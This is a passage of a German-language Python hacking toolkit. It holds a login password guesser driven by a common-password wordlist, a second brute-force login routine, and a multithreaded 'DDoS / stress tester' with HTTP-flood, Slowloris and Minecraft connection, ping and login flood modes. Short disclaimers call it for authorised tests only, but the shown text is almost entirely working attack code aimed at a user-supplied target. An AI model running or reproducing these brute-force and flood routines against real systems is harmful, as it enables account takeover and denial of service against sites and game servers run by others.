    own_pws_raw = inp("Eigene Passwörter zum Testen (kommagetrennt, leer = nur Standard)")
    own_pws = [p.strip() for p in own_pws_raw.split(",") if p.strip()]

    # Passwort-Wordlist
    common = [
        "123456","password","123456789","12345678","12345","1234567","1234567890",
        "qwerty","abc123","million2","000000","1234","iloveyou","aaron431","password1",
        "qqww1122","123","omgpop","123321","654321","qwerty123","admin","666666",
        "18atcskd2w","password123","7777777","sunshine","master","696969","welcome",
        "shadow","123abc","letmein","passw0rd","monkey","dragon","111111","baseball",
        "trustno1","superman","batman","access","hello","login","test","guest",
        username, username+"123", username+"1", username+"!", username+"2024",
        username.capitalize(), username.upper(),
    ]
    if own_pws:
        # Eigene Passwörter zuerst testen
        passwords = own_pws + [p for p in common if p not in own_pws]
    else:
        passwords = common

    fail_str = inp("Text der bei FALSCHEM Passwort erscheint (z.B. 'Invalid') — leer = HTTP-Code nutzen")

    div()
    print(f"  {DG}╔{'═'*62}╗{R}")
    print(f"  {DG}║{R}  {YG}ZIEL:{R} {G}{url[:54]}{R}")
    print(f"  {DG}║{R}  {YG}USER:{R} {G}{username:<20}{R}  {YG}PASSWÖRTER:{R} {G}{len(passwords)}{R}")
    print(f"  {DG}╠{'═'*62}╣{R}")

    found_pw    = None
    locked_out  = False
    rate_limited= False
    start_t     = time.time()

    for i, pw in enumerate(passwords, 1):
        if locked_out or rate_limited: break
        try:
            if is_json:
                data = json.dumps({u_field: username, p_field: pw}).encode()
                req = urllib.request.Request(url, data=data, headers={
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": "application/json"
                })
            else:
                data = urllib.parse.urlencode({u_field: username, p_field: pw}).encode()
                req = urllib.request.Request(url, data=data, headers={
                    "User-Agent": "Mozilla/5.0",
                    "Content-Type": "application/x-www-form-urlencoded"
                })
            with urllib.request.urlopen(req, timeout=8) as r:
                body  = r.read(8192).decode(errors="ignore")
                code  = r.status
                final = r.url

            # Rate-Limit erkennen
            if code == 429:
                rate_limited = True
                print(f"  {DG}║{R}  {C}[RATE LIMIT]{R}  Server blockiert nach {i} Versuchen — {G}SICHER{R}")
                break

            # Account-Lockout erkennen
            if any(x in body.lower() for x in ["account locked","zu viele","too many","blocked","gesperrt","locked out"]):
                locked_out = True
                print(f"  {DG}║{R}  {C}[LOCKOUT]{R}  Account-Sperre nach {i} Versuchen — {G}SICHER{R}")
                break

            # Erfolg prüfen
            success = False
            if fail_str:
                success = fail_str.lower() not in body.lower()
            else:
                # Heuristik: Redirect weg von /login = Erfolg
                success = (final != url and "login" not in final.lower()) or code in (200,302)

            tag = f"{G}[{i:>3}]{R}" if pw in own_pws else f"{DIM}[{i:>3}]{R}"
            if success:
                found_pw = pw
                print(f"  {DG}║{R}  {G}[GEFUNDEN!]{R}  {YG}{pw}{R}  →  {G}Login erfolgreich!{R}")
                break
            else:
                # Nur eigene Passwörter immer anzeigen, Standard nur alle 10
                if pw in own_pws or i % 10 == 0:
                    elapsed = int(time.time() - start_t)
                    speed   = i / max(elapsed, 1)
                    sys.stdout.write(f"\r  {DG}║{R}  {DIM}[{i:>3}/{len(passwords)}]{R}  {DIM}{pw:<22}{R}  {DIM}{speed:.1f}/s{R}   ")
                    sys.stdout.flush()

        except urllib.error.HTTPError as e:
            if e.code == 429:
                rate_limited = True
                print(f"\n  {DG}║{R}  {C}[RATE LIMIT 429]{R}  Blockiert nach {i} Versuchen — {G}GUT{R}")
                break
            elif e.code in (403, 503):
                print(f"\n  {DG}║{R}  {C}[BLOCKED {e.code}]{R}  Server blockiert — {G}SICHER{R}")
                locked_out = True; break
        except Exception as e:
            pass
        time.sleep(0.12)

    print()
    print(f"  {DG}╠{'═'*62}╣{R}")
    elapsed = time.time() - start_t

    # ── Ergebnis-Report ────────────────────────────────────
    if found_pw:
        print(f"  {DG}║{R}  {G}⚠  PASSWORT GEKNACKT: {YG}{found_pw}{R}")
        print(f"  {DG}║{R}  {G}   → Ändere dieses Passwort SOFORT!{R}")
        print(f"  {DG}║{R}  {G}   → Nutze min. 12 Zeichen + Sonderzeichen{R}")
    elif locked_out:
        print(f"  {DG}║{R}  {G}[✓] Account-Lockout aktiv — gute Sicherheit{R}")
    elif rate_limited:
        print(f"  {DG}║{R}  {G}[✓] Rate-Limiting aktiv — gute Sicherheit{R}")
    else:
        print(f"  {DG}║{R}  {G}[✓] Kein Passwort gefunden in {len(passwords)} Versuchen{R}")
        print(f"  {DG}║{R}  {DIM}   Kein Rate-Limit oder Lockout erkannt — Login ungeschützt!{R}")

    speed_avg = len(passwords) / max(elapsed, 1)
    print(f"  {DG}║{R}  {DIM}Zeit: {elapsed:.1f}s  |  Getestet: {i}  |  Ø {speed_avg:.1f}/s{R}")
    print(f"  {DG}╚{'═'*62}╝{R}")
    wait()


# ── 100  BRUTE FORCE LOGIN ───────────────────────────────────
def bruteforce_login():
    hdr("HTTP BRUTE FORCE LOGIN")
    print(f"  {DIM}Nur für autorisierte Pentests! Testet Login-Formulare.{R}\n")
    url      = inp("Login-URL (z.B. http://192.168.1.1/login)")
    if not url: wait(); return
    u_field  = inp("Benutzername-Feldname [username]") or "username"
    p_field  = inp("Passwort-Feldname [password]") or "password"
    username = inp("Benutzername")
    if not username: wait(); return
    wl = inp("Passwortliste (Komma-getrennt) oder ENTER für Standard")
    if wl.strip():
        passwords = [p.strip() for p in wl.split(",")]
    else:
        passwords = ["admin","password","123456","password123","admin123",
                     "letmein","qwerty","abc123","monkey","master","dragon",
                     "1234","12345","password1","test","root","toor","pass",
                     "000000","111111","123123","1q2w3e4r","welcome","login",
                     username, username+"123", username+"1", f"{username}@123"]
    fail_str = inp("Fehlermeldungs-Text (z.B. 'Invalid password')")
    div()
    print(f"  {DG}Teste {len(passwords)} Passwörter für '{username}' ...{R}\n")
    found = None
    for i, pw in enumerate(passwords, 1):
        data = urllib.parse.urlencode({u_field: username, p_field: pw}).encode()
        try:
            req = urllib.request.Request(url, data=data,
                headers={"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded"})
            with urllib.request.urlopen(req, timeout=8) as r:
                body = r.read(8192).decode(errors="ignore")
            if fail_str and fail_str.lower() not in body.lower():
                found = pw
                print(f"  {G}[✓] PASSWORT GEFUNDEN: {YG}{pw}{R}")
                break
            elif not fail_str:
                print(f"  {DIM}[{i:>3}] {pw:<20} — {r.status}{R}")
            else:
                print(f"  {DIM}[{i:>3}] {pw:<20} — fehlgeschlagen{R}")
        except Exception as e:
            print(f"  {DIM}[{i:>3}] {pw:<20} — {e}{R}")
        time.sleep(0.15)
    if not found:
        print(f"\n  {G}[✗] Kein Passwort gefunden.{R}")
    wait()


# ── 106  DDoS / STRESS TESTER ────────────────────────────────
def ddos_stress_tester():
    RED  = "\033[91m"; BRED = "\033[1;91m"
    GRN  = "\033[92m"; YEL  = "\033[93m"
    BLU  = "\033[96m"; DIM2 = "\033[2m"
    W    = 74
    hdr("DDoS / STRESS TESTER")
    print(f"  {BRED}Nur auf eigene / autorisierte Ziele!{R}")
    print(f"  {DIM}Testet wann der Server unter Last langsamer wird oder abstürzt.{R}\n")
    print(f"  {BLU}Ziel-Typ:{R}")
    print(f"  {DIM}  (1) Webseite (HTTP/HTTPS){R}")
    print(f"  {DIM}  (2) Minecraft-Server{R}")
    target_type = (inp("Auswahl [1]") or "1").strip()

    # ══════════════════════════════════════════════════════
    # MINECRAFT-MODUS
    # ══════════════════════════════════════════════════════
    if target_type == "2":
        import threading as _thr, socket as _sock, struct as _struct

        mc_host = inp("Minecraft Server IP/Hostname")
        if not mc_host: wait(); return
        try:
            mc_port = int(inp("Port [25565]") or "25565")
        except: mc_port = 25565
        try:
            threads_n = int(inp("Gleichzeitige Threads [20]") or "20")
            threads_n = max(1, min(threads_n, 300))
        except: threads_n = 20
        try:
            duration = int(inp("Testdauer in Sekunden [30]") or "30")
            duration = max(5, min(duration, 300))
        except: duration = 30

        print(f"\n  {BLU}Test-Modus:{R}")
        print(f"  {DIM}  (1) Connection Flood — viele TCP-Verbindungen{R}")
        print(f"  {DIM}  (2) Ping Flood — Status-Pakete wie echte Clients{R}")
        print(f"  {DIM}  (3) Login Flood — Handshake + Login-Request{R}")
        print(f"  {DIM}  (4) Alles kombiniert{R}")
        mc_mode = (inp("Modus [1]") or "1").strip()

        lock      = _thr.Lock()
        stats     = {"sent":0, "ok":0, "err":0, "slow":0, "down":0, "total_ms":0.0}
        timeline  = []
        stop_flag = [False]
        crash_time= [None]

        # ── Minecraft Varint encoder ─────────────────────
        def _varint(val):
            out = b""
            while True:
                b = val & 0x7F
                val >>= 7
                if val: b |= 0x80
                out += bytes([b])
                if not val: break
            return out

        def _mc_packet(data):
            return _varint(len(data)) + data

        def _handshake_packet(host, port, next_state=1):
            payload  = _varint(0x00)           # Packet ID
            payload += _varint(764)            # Protocol version (1.20.x)
            payload += _varint(len(host)) + host.encode()
            payload += _struct.pack(">H", port)
            payload += _varint(next_state)
            return _mc_packet(payload)

        def _status_request():
            return _mc_packet(_varint(0x00))

        def _login_start(name="StressBot"):
            payload  = _varint(0x00)
            payload += _varint(len(name)) + name.encode()
            return _mc_packet(payload)

        # ── Worker-Funktionen ─────────────────────────────
        def _conn_flood():
            while not stop_flag[0]:
                t0 = time.time()
                try:
                    s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((mc_host, mc_port))
                    ms = int((time.time()-t0)*1000)
                    s.close()
                    with lock:
                        stats["sent"] += 1; stats["ok"] += 1
                        stats["total_ms"] += ms
                        timeline.append((time.time(), ms, 200))
                        if ms > 2000: stats["slow"] += 1
                except:
                    ms = int((time.time()-t0)*1000)
                    with lock:
                        stats["sent"] += 1; stats["err"] += 1; stats["down"] += 1
                        stats["total_ms"] += ms
                        timeline.append((time.time(), ms, 0))
                        if crash_time[0] is None and stats["down"] > threads_n // 2:
                            crash_time[0] = time.time()

        def _ping_flood():
            while not stop_flag[0]:
                t0 = time.time()
                try:
                    s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((mc_host, mc_port))
                    s.sendall(_handshake_packet(mc_host, mc_port, next_state=1))
                    s.sendall(_status_request())
                    data = b""
                    while len(data) < 4:
                        chunk = s.recv(1024)
                        if not chunk: break
                        data += chunk
                    s.close()
                    ms = int((time.time()-t0)*1000)
                    with lock:
                        stats["sent"] += 1; stats["ok"] += 1
                        stats["total_ms"] += ms
                        timeline.append((time.time(), ms, 200))
                        if ms > 2000: stats["slow"] += 1
                except:
                    ms = int((time.time()-t0)*1000)
                    with lock:
                        stats["sent"] += 1; stats["err"] += 1; stats["down"] += 1
                        stats["total_ms"] += ms
                        timeline.append((time.time(), ms, 0))
                        if crash_time[0] is None and stats["down"] > threads_n // 2:
                            crash_time[0] = time.time()

        def _login_flood():
            names = [f"Bot{random.randint(1000,9999)}" for _ in range(50)]
            while not stop_flag[0]:
                t0   = time.time()
                name = random.choice(names)
                try:
                    s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((mc_host, mc_port))
                    s.sendall(_handshake_packet(mc_host, mc_port, next_state=2))
                    s.sendall(_login_start(name))
                    resp = s.recv(256)
                    s.close()
                    ms = int((time.time()-t0)*1000)
                    with lock:
                        stats["sent"] += 1; stats["ok"] += 1
                        stats["total_ms"] += ms
                        timeline.append((time.time(), ms, 200))
                        if ms > 2000: stats["slow"] += 1
                except:
                    ms = int((time.time()-t0)*1000)
                    with lock:
                        stats["sent"] += 1; stats["err"] += 1; stats["down"] += 1
                        stats["total_ms"] += ms
                        timeline.append((time.time(), ms, 0))
                        if crash_time[0] is None and stats["down"] > threads_n // 2:
                            crash_time[0] = time.time()

        # ── Erster Ping: Serverinfo holen ─────────────────
        clear(); print(BANNER)
        print(f"\n  {BLU}Verbinde zu {YEL}{mc_host}:{mc_port}{R} ...")
        try:
            s0 = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
            s0.settimeout(10)
            s0.connect((mc_host, mc_port))
            s0.sendall(_handshake_packet(mc_host, mc_port, 1))
            s0.sendall(_status_request())
            raw = b""
            for _ in range(20):
                chunk = s0.recv(4096)
                if not chunk: break
                raw += chunk
                if b"description" in raw or b"players" in raw: break
            s0.close()
            # Extrahiere JSON aus Response (nach Varint-Header)
            json_start = raw.find(b"{")
            if json_start != -1:
                try:
                    info = json.loads(raw[json_start:].split(b"\x00")[0].decode(errors="ignore"))
                    motd    = str(info.get("description","?"))[:50]
                    players = info.get("players",{})
                    online  = players.get("online","?")
                    maxp    = players.get("max","?")
                    ver     = info.get("version",{}).get("name","?")
                    print(f"  {GRN}[✓] Server erreichbar{R}")
                    print(f"  {DIM}MOTD:{R}     {YEL}{motd}{R}")
                    print(f"  {DIM}Spieler:{R}  {YEL}{online}/{maxp}{R}")
                    print(f"  {DIM}Version:{R}  {YEL}{ver}{R}")
                except:
                    print(f"  {GRN}[✓] Server erreichbar (kein MOTD gelesen){R}")
            else:
                print(f"  {GRN}[✓] TCP-Verbindung OK{R}")
        except Exception as e:
            print(f"  {YEL}[~] Erster Ping fehlgeschlagen: {e}{R}")
            print(f"  {DIM}Server könnte trotzdem erreichbar sein (Firewall, Anti-Bot, Ping-Schutz).{R}")
            cont = (inp("Trotzdem testen? (j/n) [j]") or "j").lower()
            if cont == "n": wait(); return

        print(f"\n  {BRED}Starte Stress-Test:{R}  {YEL}{mc_host}:{mc_port}{R}")
        mc_mode_name = {"1":"Connection Flood","2":"Ping Flood","3":"Login Flood","4":"Kombiniert"}.get(mc_mode,"Connection Flood")
        print(f"  {DIM}Threads: {threads_n}  |  Dauer: {duration}s  |  Modus: {mc_mode_name}{R}\n")
        time.sleep(1.5)

        if mc_mode == "2":   worker_fn = _ping_flood
        elif mc_mode == "3": worker_fn = _login_flood
        else:                worker_fn = _conn_flood

        thread_list = []
        if mc_mode == "4":
            third = threads_n // 3
            for _ in range(third):
                t = _thr.Thread(target=_conn_flood,  daemon=True); t.start(); thread_list.append(t)
            for _ in range(third):
                t = _thr.Thread(target=_ping_flood,  daemon=True); t.start(); thread_list.append(t)
            for _ in range(threads_n - 2*third):
                t = _thr.Thread(target=_login_flood, daemon=True); t.start(); thread_list.append(t)
        else:
            for _ in range(threads_n):
                t = _thr.Thread(target=worker_fn, daemon=True); t.start(); thread_list.append(t)

        bar_width = 40
        t_start   = time.time()
        try:
            while True:
                elapsed = time.time() - t_start
                if elapsed >= duration: break
                clear(); print(BANNER)
                pct  = min(elapsed / duration, 1.0)
                done = int(pct * bar_width)
                bar  = f"{GRN}{'█'*done}{DIM2}{'░'*(bar_width-done)}{R}"
                avg_ms = (stats["total_ms"] / stats["sent"]) if stats["sent"] else 0
                rps    = stats["sent"] / max(elapsed, 1)
                lc = GRN if avg_ms < 500 else YEL if avg_ms < 2000 else BRED
                print(f"  {DG}╔{'═'*W}╗{R}")
                print(f"  {DG}║{R}{_pad(f'  {BRED}▶ MC STRESS TEST  {DIM2}—  {YEL}{mc_host}:{mc_port}{R}', W)}{DG}║{R}")
                print(f"  {DG}╠{'═'*W}╣{R}")
                print(f"  {DG}║{R}  {bar}  {YEL}{elapsed:.0f}s / {duration}s{R}")
                print(f"  {DG}╠{'═'*W}╣{R}")
                print(f"  {DG}║{R}  {DIM2}Verbindungen:{R}  {YEL}{stats['sent']:<8}{R}  {DIM2}Req/s:{R}  {YEL}{rps:.1f}{R}")
                print(f"  {DG}║{R}  {GRN}OK:{R}  {stats['ok']:<8}{RED}Fehler:{R}  {stats['err']:<8}{BRED}Down:{R}  {stats['down']}")
                print(f"  {DG}║{R}  {DIM2}Ø Latenz:{R}  {lc}{avg_ms:.0f}ms{R}  {DIM2}Langsam (>2s):{R}  {YEL}{stats['slow']}{R}")
                # Mini-Graph
                if len(timeline) >= 5:
                    recent = [ms for _,ms,_ in timeline[-bar_width:]]
                    max_ms = max(recent) or 1
                    print(f"  {DG}╠{'═'*W}╣{R}")
                    for row in range(3, 0, -1):
                        thresh = max_ms * row / 3
                        chars = []
                        for ms in recent:
                            chars.append((f"{BRED}█{R}" if ms > 2000 else f"{YEL}▄{R}" if ms > 500 else f"{GRN}▁{R}") if ms >= thresh else f"{DIM2}·{R}")
                        print(f"  {DG}║{R}  {DIM2}{int(thresh):>5}ms{R}  {''.join(chars)}")
                print(f"  {DG}╠{'═'*W}╣{R}")
                if crash_time[0]:
                    print(f"  {DG}║{R}  {BRED}⚠  SERVER NICHT MEHR ERREICHBAR!{R}")
                elif stats["err"] > stats["sent"] * 0.5 and stats["sent"] > 10:
                    print(f"  {DG}║{R}  {RED}⚡  ÜBERLASTET — {stats['err']/max(stats['sent'],1)*100:.0f}% Fehler{R}")
                elif avg_ms > 2000:
                    print(f"  {DG}║{R}  {YEL}⚡  LANGSAM — Ø {avg_ms:.0f}ms{R}")
                else:
                    print(f"  {DG}║{R}  {GRN}✓  Server antwortet — {threads_n} gleichzeitige Verbindungen{R}")
                print(f"  {DG}╚{'═'*W}╝{R}")
                print(f"  {DIM}Strg+C zum Abbrechen{R}")
                time.sleep(0.8)
        except KeyboardInterrupt: pass

        stop_flag[0] = True
        elapsed  = time.time() - t_start
        avg_ms   = (stats["total_ms"] / stats["sent"]) if stats["sent"] else 0
        err_rate = (stats["err"] / stats["sent"] * 100) if stats["sent"] else 0
        rps      = stats["sent"] / max(elapsed, 1)

        # Abschluss
        clear(); print(BANNER)
        print(f"  {DG}╔{'═'*W}╗{R}")
        print(f"  {DG}║{R}{_pad(f'  {BRED}MINECRAFT STRESS-REPORT  {DIM2}—  {YEL}{mc_host}:{mc_port}{R}', W)}{DG}║{R}")
        print(f"  {DG}╠{'═'*W}╣{R}")

        if crash_time[0] or stats["down"] > threads_n:
            verdict = f"{BRED}SERVER ABGESTÜRZT / NICHT ERREICHBAR{R}"
        elif err_rate > 50:
            verdict = f"{RED}ÜBERLASTET — {err_rate:.0f}% Fehler{R}"
        elif avg_ms > 2000:
            verdict = f"{YEL}BELASTET — Ø {avg_ms:.0f}ms{R}"
        else:
            verdict = f"{GRN}STABIL — hat gehalten{R}"

        print(f"  {DG}║{R}  {DIM2}Urteil:{R}  {verdict}")
        print(f"  {DG}║{R}  {DIM2}Verbindungen:{R}  {YEL}{stats['sent']}{R}  in {elapsed:.1f}s  ({rps:.1f}/s)")
        print(f"  {DG}║{R}  {GRN}OK:{R}   {stats['ok']:<6}  {RED}Fehler:{R}  {stats['err']:<6}  {BRED}Down:{R}  {stats['down']}")
        print(f"  {DG}║{R}  {DIM2}Ø Latenz:{R}  {avg_ms:.0f}ms")
        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {BLU}Empfehlungen:{R}")
        mc_recs = []
        if err_rate > 20 or avg_ms > 2000:
            mc_recs.append("tcpshield.com oder TCPShield einschalten (kostenloser MC DDoS-Schutz)")
        if stats["down"] > 0:
            mc_recs.append("BungeeCord/Velocity als Proxy nutzen — Hauptserver verstecken")
        if avg_ms > 500:
            mc_recs.append("Server-RAM erhöhen + Paper/Purpur statt Vanilla nutzen")
        mc_recs.append("max-players begrenzen + connection-throttle in server.properties setzen")
        mc_recs.append("Firewall: nur Port 25565 öffnen + fail2ban für Login-Flood")
        for r in mc_recs:
            print(f"  {DG}║{R}  {DIM2}→ {r}{R}")
        print(f"  {DG}╚{'═'*W}╝{R}")
        wait()
        return

    # ══════════════════════════════════════════════════════
    # WEBSEITEN-MODUS (bisheriger Code)
    # ══════════════════════════════════════════════════════
    base = inp("Ziel-URL (z.B. https://example.com)")
    if not base: wait(); return
    if not base.startswith("http"): base = "http://" + base
    base = base.rstrip("/")

    try:
        threads_n = int(inp("Gleichzeitige Threads [10]") or "10")
        threads_n = max(1, min(threads_n, 500))
    except: threads_n = 10

    try:
        duration  = int(inp("Testdauer in Sekunden [30]") or "30")
        duration  = max(5, min(duration, 300))
    except: duration = 30

    mode = (inp("Modus: (1) HTTP-Flood  (2) Slowloris  (3) Beides  [1]") or "1").strip()

    # Gemeinsame Zähler (thread-safe mit Lock)
    import threading as _thr
    lock       = _thr.Lock()
    stats      = {"sent":0, "ok":0, "err":0, "slow":0, "down":0, "total_ms":0.0}
    timeline   = []   # (timestamp, latency_ms, status_code)
    stop_flag  = [False]
    crash_time = [None]

    def _req_raw(url, timeout=5):
        try:
            t0  = time.time()
            req = urllib.request.Request(url, headers={"User-Agent":"Mozilla/5.0","Connection":"keep-alive"})
            with urllib.request.urlopen(req, timeout=timeout) as r:
                r.read(1024)
                return r.status, int((time.time()-t0)*1000)
        except urllib.error.HTTPError as e:
            return e.code, int((time.time()-t0)*1000)
        except:
            return 0, int((time.time()-t0)*1000)

    # ── HTTP Flood Worker ─────────────────────────────────────
    def _flood_worker():
        while not stop_flag[0]:
            code, ms = _req_raw(base, timeout=8)
            ts = time.time()
            with lock:
                stats["sent"] += 1
                stats["total_ms"] += ms
                timeline.append((ts, ms, code))
                if code in (200,301,302,304):
                    stats["ok"] += 1
                elif code == 0:
                    stats["err"] += 1
                    stats["down"] += 1
                    if crash_time[0] is None:
                        crash_time[0] = ts
                else:
                    stats["err"] += 1
                if ms > 3000:
                    stats["slow"] += 1

    # ── Slowloris Worker ─────────────────────────────────────
    def _slowloris_worker():
        import socket as _sock, ssl as _ssl
        host = base.replace("https://","").replace("http://","").split("/")[0]
        port = 443 if base.startswith("https") else 80
        socks = []
        while not stop_flag[0]:
            try:
                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                if port == 443:
                    ctx = _ssl.create_default_context()
                    s = ctx.wrap_socket(s, server_hostname=host)
                s.send(f"GET /?{random.randint(0,99999)} HTTP/1.1\r\nHost: {host}\r\n".encode())
                socks.append(s)
                with lock: stats["sent"] += 1
            except: pass
            # Keepalive — schickt Header aber nie den Abschluss
            for s2 in list(socks):
                try:
                    s2.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                except:
                    socks.remove(s2)
            time.sleep(0.5)
        for s2 in socks:
            try: s2.close()
            except: pass

    # ── UI-Renderer ───────────────────────────────────────────
    def _draw_ui(elapsed, bar_width=40):
        clear(); print(BANNER)
        print(f"  {DG}╔{'═'*W}╗{R}")
        print(f"  {DG}║{R}{_pad(f'  {BRED}▶ STRESS TEST  {DIM2}—  {YEL}{base}{R}', W)}{DG}║{R}")
        print(f"  {DG}╠{'═'*W}╣{R}")

        pct  = min(elapsed / duration, 1.0)
        done = int(pct * bar_width)
        bar  = f"{GRN}{'█'*done}{DIM2}{'░'*(bar_width-done)}{R}"
        print(f"  {DG}║{R}  {bar}  {YEL}{elapsed:.0f}s / {duration}s{R}")

        avg_ms = (stats["total_ms"] / stats["sent"]) if stats["sent"] else 0
        rps    = stats["sent"] / max(elapsed, 1)

        # Latenz-Farbe
        if avg_ms < 500:    lc = GRN
        elif avg_ms < 2000: lc = YEL
        else:               lc = BRED

        print(f"  {DG}╠{'═'*W}╣{R}")
        print(f"  {DG}║{R}  {DIM2}Requests gesendet:{R}  {YEL}{stats['sent']:<8}{R}"
              f"  {DIM2}Req/s:{R}  {YEL}{rps:.1f}{R}")
        print(f"  {DG}║{R}  {GRN}Erfolgreich:{R}  {stats['ok']:<8}{R}"
              f"  {RED}Fehler:{R}  {stats['err']:<8}"
              f"  {BRED}Timeouts:{R}  {stats['down']}{R}")
        print(f"  {DG}║{R}  {DIM2}Ø Latenz:{R}  {lc}{avg_ms:.0f} ms{R}"
              f"  {DIM2}Langsam (>3s):{R}  {YEL}{stats['slow']}{R}")

        # Latenz-Graph (letzte 40 Messungen)
        if timeline:
            recent = [ms for _,ms,_ in timeline[-bar_width:]]
            if recent:
                max_ms = max(recent) or 1
                rows = 5
                print(f"  {DG}╠{'═'*W}╣{R}")
                print(f"  {DG}║{R}  {BLU}Latenz-Verlauf (letzte {len(recent)} Requests):{R}")
                for row in range(rows, 0, -1):
                    thresh = max_ms * row / rows
                    line_chars = []
                    for ms in recent:
                        if ms >= thresh:
                            line_chars.append(f"{BRED}█{R}" if ms > 3000 else f"{YEL}▄{R}" if ms > 1000 else f"{GRN}▁{R}")
                        else:
                            line_chars.append(f"{DIM2}·{R}")
                    print(f"  {DG}║{R}  {DIM2}{int(thresh):>5}ms{R}  {''.join(line_chars)}")

        # Status-Anzeige
        print(f"  {DG}╠{'═'*W}╣{R}")
        if stats["down"] > 0 and crash_time[0]:
            elapsed_crash = crash_time[0] - (time.time() - elapsed)
            print(f"  {DG}║{R}  {BRED}⚠  AUSFALL erkannt nach {elapsed:.0f}s — Seite antwortet nicht mehr!{R}")
        elif stats["slow"] > stats["sent"] * 0.3 and stats["sent"] > 10:
            print(f"  {DG}║{R}  {YEL}⚡  LANGSAM — über 30% der Requests brauchen >3 Sekunden{R}")
        elif stats["err"] > stats["sent"] * 0.5 and stats["sent"] > 10:
            print(f"  {DG}║{R}  {RED}⚡  ÜBERLASTET — über 50% Fehlerrate{R}")
        else:
            print(f"  {DG}║{R}  {GRN}✓  Seite antwortet normal — Threads: {threads_n}{R}")
        print(f"  {DG}╚{'═'*W}╝{R}")
        print(f"  {DIM}Strg+C zum Abbrechen{R}")

    # ── Threads starten ───────────────────────────────────────
    clear(); print(BANNER)
    print(f"\n  {BRED}Starte Stress-Test:{R}  {YEL}{base}{R}")
    print(f"  {DIM}Threads: {threads_n}  |  Dauer: {duration}s  |  Modus: {['','HTTP-Flood','Slowloris','Beides'][int(mode) if mode in '123' else 1]}{R}\n")
    time.sleep(1)

    worker_fn = _slowloris_worker if mode == "2" else _flood_worker
    if mode == "3":
        thread_list = []
        half = threads_n // 2
        for _ in range(half):
            t = _thr.Thread(target=_flood_worker,    daemon=True); t.start(); thread_list.append(t)
        for _ in range(threads_n - half):
            t = _thr.Thread(target=_slowloris_worker, daemon=True); t.start(); thread_list.append(t)
    else:
        thread_list = []
        for _ in range(threads_n):
            t = _thr.Thread(target=worker_fn, daemon=True); t.start(); thread_list.append(t)

    t_start = time.time()
    try:
        while True:
            elapsed = time.time() - t_start
            if elapsed >= duration:
                break
            _draw_ui(elapsed)
            time.sleep(0.8)
    except KeyboardInterrupt:
        pass

    stop_flag[0] = True
    elapsed = time.time() - t_start
    _draw_ui(elapsed)

    # ── Abschluss-Report ─────────────────────────────────────
    avg_ms    = (stats["total_ms"] / stats["sent"]) if stats["sent"] else 0
    err_rate  = (stats["err"] / stats["sent"] * 100) if stats["sent"] else 0
    slow_rate = (stats["slow"] / stats["sent"] * 100) if stats["sent"] else 0
    rps       = stats["sent"] / max(elapsed, 1)

    print(f"\n  {DG}╔{'═'*W}╗{R}")
    print(f"  {DG}║{R}{_pad(f'  {BRED}ERGEBNIS-REPORT{R}', W)}{DG}║{R}")
    print(f"  {DG}╠{'═'*W}╣{R}")

    # Stabilitätsbewertung
    if stats["down"] > 0:
        verdict = f"{BRED}ABGESTÜRZT{R}"; vdesc = "Seite hat nicht mehr geantwortet!"
    elif err_rate > 50:
        verdict = f"{RED}ÜBERLASTET{R}"; vdesc = f"{err_rate:.0f}% Fehlerrate — kurz vor Ausfall"
    elif slow_rate > 40 or avg_ms > 3000:
        verdict = f"{YEL}ÜBERLASTET{R}"; vdesc = f"Ø {avg_ms:.0f}ms — massive Verlangsamung"
    elif slow_rate > 15 or avg_ms > 1000:
        verdict = f"{YEL}BELASTET{R}"; vdesc = f"Ø {avg_ms:.0f}ms — spürbare Verlangsamung"
    else:
        verdict = f"{GRN}STABIL{R}"; vdesc = "Seite hat gehalten"

    print(f"  {DG}║{R}  {DIM2}Urteil:{R}  {verdict}  {DIM2}{vdesc}{R}")
    print(f"  {DG}║{R}  {DIM2}Requests:{R}  {YEL}{stats['sent']}{R}  in {elapsed:.1f}s  ({rps:.1f} req/s)")
    print(f"  {DG}║{R}  {GRN}OK:{R}   {stats['ok']:<6}  {RED}Fehler:{R}  {stats['err']:<6}  {BRED}Down:{R}  {stats['down']}")
    print(f"  {DG}║{R}  {DIM2}Ø Latenz:{R}  {avg_ms:.0f}ms   {DIM2}Slow (>3s):{R}  {stats['slow']} ({slow_rate:.0f}%)")

    # Schwellenwerte-Tabelle
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {BLU}Stabilitätsschwellen:{R}")
    marks = [
        (avg_ms < 500,   f"Ø Latenz < 500ms:   {avg_ms:.0f}ms",  "Reaktionszeit gut"),
        (avg_ms < 2000,  f"Ø Latenz < 2000ms:  {avg_ms:.0f}ms",  "Noch akzeptabel"),
        (err_rate < 5,   f"Fehlerrate < 5%:    {err_rate:.1f}%",  "Fehlerrate OK"),
        (err_rate < 20,  f"Fehlerrate < 20%:   {err_rate:.1f}%",  "Noch tolerierbar"),
        (stats["down"]==0, "Kein kompletter Ausfall",             ""),
        (rps > 5,        f"Req/s > 5:          {rps:.1f}",        "Throughput OK"),
    ]
    for ok, label, note in marks:
        icon = f"{GRN}[✓]{R}" if ok else f"{RED}[✗]{R}"
        print(f"  {DG}║{R}  {icon}  {DIM2}{label:<35}{R}  {DIM2}{note}{R}")

    # Empfehlung
    print(f"  {DG}╠{'═'*W}╣{R}")
    print(f"  {DG}║{R}  {BLU}Empfehlungen:{R}")
    recs = []
    if avg_ms > 1000 or err_rate > 10:
        recs.append("Rate-Limiting einschalten (nginx: limit_req_zone)")
    if stats["down"] > 0:
        recs.append("Cloudflare DDoS-Schutz aktivieren (Under Attack Mode)")
    if slow_rate > 20:
        recs.append("Server-Ressourcen erhöhen (RAM/CPU) oder CDN vorschalten")
    if not recs:
        recs.append("Server ist gut für diese Last — höhere Threadzahl testen")
    recs.append("Für echten DDoS-Schutz: Cloudflare Magic Transit / AWS Shield")
    for r in recs:
        print(f"  {DG}║{R}  {DIM2}→ {r}{R}")

    # Latenz-Breakdown
    if timeline:
